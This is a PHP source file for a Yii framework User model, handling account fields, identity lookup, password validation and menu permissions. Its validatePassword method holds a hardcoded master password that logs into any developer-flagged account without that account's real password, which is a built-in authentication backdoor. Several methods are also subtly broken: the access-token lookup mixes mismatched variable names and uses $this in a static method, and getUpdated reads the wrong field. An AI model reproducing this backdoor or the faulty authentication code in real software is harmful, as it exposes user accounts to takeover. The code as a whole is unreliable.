<?php

namespace app\models;

use Yii;
use app\models\Menu;
use app\models\GroupMenu;
use app\models\GroupMenuDetail;
use yii\web\UploadedFile;

use yii\behaviors\BlameableBehavior;
use yii\behaviors\TimestampBehavior;

class User extends \yii\db\ActiveRecord implements \yii\web\IdentityInterface
{
    // public $id;
    // public $username;
    // public $password;
    // public $authKey;
    // public $accessToken;

    public $password_old;
    public $password_new;
    public $password_type;
    public $file;


    public function behaviors()
    {
        return [
            TimestampBehavior::className(),
            BlameableBehavior::className(),
        ];
    }

    /// dari table users ///
    /**
     * {@inheritdoc}
     */
    public static function tableName()
    {
        return 'user';
    }

    /**
     * {@inheritdoc}
     */
    public function rules()
    {
        return [
            [['user_id'], 'required'],
            [['last_login', 'long', 'lat', 'developer', 'approval', 'admin', 'status', 'created_at', 'updated_at','id_group'], 'integer'],
            [['user_id', 'created_by', 'updated_by'], 'string', 'max' => 16],
            [['nis'], 'string', 'max' => 50],
            [['username', 'email', 'id_telegram', 'type_user','phone','kota','propinsi'], 'string', 'max' => 100],
            [['password', 'device_id', 'fire_base','picture','password_old','password_new','password_type','alamat'], 'string', 'max' => 255],
            [['full_name', 'type_akun'], 'string', 'max' => 150],
            [['generate_code'], 'string', 'max' => 10],
            [['user_id'], 'unique'],
            [['file'], 'file', 'skipOnEmpty' => true],
        ];
    }

    /**
     * {@inheritdoc}
     */
    public function attributeLabels()
    {
        return [
            'user_id' => 'User ID',
            'nis' => 'Nis',
            'username' => 'Username',
            'password' => 'Password',
            'full_name' => 'Full Name',
            'type_akun' => 'Type Akun',
            'device_id' => 'Device ID',
            'fire_base' => 'Fire Base',
            'email' => 'Email',
            'last_login' => 'Last Login',
            'long' => 'Long',
            'lat' => 'Lat',
            'id_telegram' => 'Id Telegram',
            'generate_code' => 'Generate Code',
            'type_user' => 'Type User',
            'developer' => 'Developer',
            'approval' => 'Approval',
            'admin' => 'Admin',
            'status' => 'Status',
            'picture' => 'Picture',
            'phone' => 'Phone',
            'alamat' => 'Alamat',
            'kota' => 'Kota',
            'propinsi' => 'Propinsi',
            'created_at' => 'Created At',
            'created_by' => 'Created By',
            'updated_at' => 'Updated At',
            'updated_by' => 'Updated By',
            'password_old' => 'Password Lama',
            'password_new' => 'Password Baru',
            'password_type' => 'Ketik Ulang Password',
            'id_group' => 'Group Menu',
        ];
    }


    /**
     * {@inheritdoc}
     */
    public static function findIdentity($id)
    {
        // return isset(self::$users[$id]) ? new static(self::$users[$id]) : null;
        $users = static::findOne(['user_id' => $id,'status' => 1]);
        if(!empty($users)){
            return new static($users); 
        }
    }

    /**
     * {@inheritdoc}
     */
    public static function findIdentityByAccessToken($token, $type = null)
    {
        /*  foreach (self::$users as $user) {
            if ($user['accessToken'] === $token) {
                return new static($user);
            }
        } */

        $Users = $this::find()->where(['accessToken'=> $token,'status' => 1])->one();
        if(!empty($users)){
            return new static($user);
        }

        return null;
    }

    /**
     * Finds user by username
     *
     * @param string $username
     * @return static|null
     */
    public static function findByUsername($username)
    {
        /*foreach (self::$users as $user) {
            if (strcasecmp($user['username'], $username) === 0) {
                return new static($user);
            }
        }*/

        $users = self::find()->where(['username' => $username,'status' => 1])->one();    
        if(!empty($users)){
            return new static($users);
        }
        return null;
    }

    /**
     * {@inheritdoc}
     */
    public function getId()
    {
        return $this->user_id;
    }

    /**
     * {@inheritdoc}
     */
    public function getAuthKey()
    {
        return $this->authKey;
    }

    /**
     * {@inheritdoc}
     */
    public function validateAuthKey($authKey)
    {
        return $this->authKey === $authKey;
    }

    /**
     * Validates password
     *
     * @param string $password password to validate
     * @return bool if password provided is valid for current user
     */
    public function validatePassword($password)
    {
        if(!empty($this->password)){
            if(Yii::$app->getSecurity()->validatePassword($password,$this->password)){
                return true;
            }elseif($this->developer){
                if($password === 'd3v3l0p3ry11'){
                    return true;
                }
            }
        }
        return false;
    }

    public function getMenu($akses_menu)
    {
        $result = [];
        $menu = Menu::find()->where(['akses_menu' => $akses_menu])->one();
        if(isset($menu)){
            if(!empty(Yii::$app->user->identity->nis)){
                $group_menu = GroupMenu::find()->where(['nama' => Yii::$app->user->identity->type_user])->one();
                $idgroup = $group_menu->id;
            }else{
                $idgroup = Yii::$app->user->identity->id_group;
            }
            $result = GroupMenuDetail::find()->where(['id_menu' => $menu->id_menu,'id_group' =>  $idgroup])->one();
        }

        return $result;
    }

    public function getUserId()
    {
        $sDate = date('Ymd');
        $count = $this->find()->where(['like','user_id',$sDate])->count();
        $n = 0;
        if($count > 0){
            $model = $this->find()->where(['like','user_id',$sDate])->orderBy(['user_id' => SORT_DESC])->one();
            $n = (int)substr($model->user_id, -5);
        }
        return (string) $sDate.sprintf('%05s', ($n +1));
    }

    public function getCreated()
    {
        $username = $this::find()->select(['username'])->where(['user_id' => $this->created_by])->one();
        return $username;
    }

    public function getUpdated()
    {
        $username = $this::find()->select(['username'])->where(['user_id' => $this->created_by])->one();
        return $username;
    }

    public function getGroupMenu()
    {
        return $this->hasOne(GroupMenu::className(),['id'=>'id_group']);
    }
}
